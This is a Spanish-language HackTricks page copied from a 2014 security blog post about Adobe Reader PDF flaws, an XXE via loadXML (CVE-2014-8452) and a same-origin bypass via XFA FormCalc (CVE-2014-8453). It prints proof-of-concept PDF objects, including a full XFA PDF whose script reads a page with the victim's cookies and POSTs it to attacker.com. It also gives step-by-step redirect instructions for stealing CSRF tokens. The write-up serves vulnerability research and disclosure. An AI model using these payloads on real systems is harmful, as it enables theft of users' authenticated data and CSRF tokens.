# Carga de PDF - Bypass de XXE y CORS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

#### Contenido copiado de [https://insert-script.blogspot.com/2014/12/multiple-pdf-vulnerabilites-text-and.html](https://insert-script.blogspot.com/2014/12/multiple-pdf-vulnerabilites-text-and.html)

### La funci√≥n Javascript en Reader se puede utilizar para leer datos de entidades externas (CVE-2014-8452)

Estado: Solucionado\
Realidad: No solucionado\
\
Este se trata de un simple XXE que descubr√≠.\
Le√≠ el art√≠culo "Polyglots: Crossing Origins by Crossing Formats", donde se discuti√≥ una vulnerabilidad en\
XMLData.parse. Era posible utilizar entidades externas y hacer referencia a ellas.\
Le√≠ la especificaci√≥n y resulta que hay m√°s funciones que "parse" para leer XML.\
Cre√© un archivo xml simple, que hace referencia a una URL del mismo dominio y lo analic√© con loadXML.\
Funcion√≥:

![](https://4.bp.blogspot.com/-is4Q5hSZk-Y/VIwdzdAckWI/AAAAAAAAACI/OAzBs9Q-T50/s1600/xxe.png)
```
7 0 obj
<<
 /Type /Action
/S /JavaScript
/JS (
var cXMLDoc = '<?xml version="1.0" encoding="ISO-8859-1"?><foo>muh</foo>'
var cXMLDoc2 = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ENTITY aaaa SYSTEM "http://example.com">]><ab>&aaaa;</ab>'
xml = XMLData.parse(cXMLDoc,false);
xml.loadXML(cXMLDoc2,false,true);
)
>>
endobj
```
El impacto es limitado porque\
o) est√° limitado al mismo origen\
o) las p√°ginas HTML rompen el XML\
o) las entidades din√°micas no son compatibles\
o) Tuve la idea de usar un XML utf-16 para evitar romper la estructura XML, pero no funcion√≥.\
\
Pero a√∫n se puede usar para leer JSON.

### Bypass de pol√≠tica de mismo origen en Reader (CVE-2014-8453)

Estado: solucionado\
Realidad: ¬°solucionado pero a√∫n vulnerable al mismo origen!\
\
En mi opini√≥n, esta es la vulnerabilidad m√°s poderosa. Incluso sin el Bypass de Origen, te muestra\
lo poderoso/aterrador que puede ser un PDF.\
Muchas personas saben que PDF admite un lenguaje de script llamado Javascript, pero hay otro.\
Se menciona en la especificaci√≥n de XFA, un tipo de archivo tambi√©n admitido por el lector de Adobe.\
Se llama formcalc y no es tan poderoso. Se utiliza para c√°lculos matem√°ticos simples. Pero en la especificaci√≥n de Adobe\
hay tres funciones adicionales: 'GET', 'POST' y 'PUT'. S√≠, sus nombres hablan por s√≠ mismos.\
'GET' tiene un par√°metro: una URL. Utilizar√° el navegador (S√ç, COOKIES) para recuperar la URL y devolver el contenido de la misma.\
Luego podemos usar 'POST' para enviar el contenido devuelto a nuestro propio servidor:\
\
var content = GET("misamigos.php");\
Post("http://atacante.com", contenido);\
\
Estas funciones son del mismo origen, por lo que un sitio web debe permitirnos cargar un PDF. Eso no es tan irrealista para\
la mayor√≠a de los sitios web. Atacante.com no es del mismo origen, por lo que necesitas configurar un crossdomain.xml, como es habitual en los productos de Adobe.\
\
En resumen: esto no es un error, es una caracter√≠stica. Tan pronto como se te permita cargar un PDF en un sitio web,\
puedes acceder al sitio web en el contexto del usuario que est√° viendo el PDF. Debido a que las solicitudes son emitidas\
por el navegador, las cookies tambi√©n se env√≠an. Tambi√©n puedes usarlo para romper cualquier protecci√≥n CSRF leyendo los tokens.
```
% a PDF file using an XFA
% most whitespace can be removed (truncated to 570 bytes or so...)
% Ange Albertini BSD Licence 2012

% modified by insertscript

%PDF-1. % can be truncated to %PDF-\0

1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="Hello World!">
            <event activity="initialize">
                <script contentType='application/x-formcalc'>
     var content = GET("myfriends.php");
                   Post("http://attacker.com",content);
                </script>
            </event>
        </field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj

trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>
```
Despu√©s de encontrar estas funciones, encontr√© un bypass de pol√≠tica de misma origen. Esto hace posible utilizar el navegador de la v√≠ctima como proxy (@beef todav√≠a est√° trabajando en el m√≥dulo^^).

El bypass es realmente simple:

1. El usuario A carga evil.pdf desde http://attacker.com/evil.pdf
2. Evil.pdf utiliza formcalc GET para leer http://attacker.com/redirect.php
3. redirect.php redirige con 301 a http://facebook.com
4. Adobe reader seguir√° y leer√° la respuesta sin buscar un crossdomain.xml.
5. evil.pdf env√≠a el contenido recuperado v√≠a POST a http://attacker.com/log.php

Tenga en cuenta que utilizando esta t√©cnica se pueden robar los tokens CRSF de una p√°gina y abusar de las vulnerabilidades CSRF.

Este simple bypass est√° arreglado ahora. Espero que implementen una advertencia de di√°logo para solicitudes de misma origen tambi√©n.
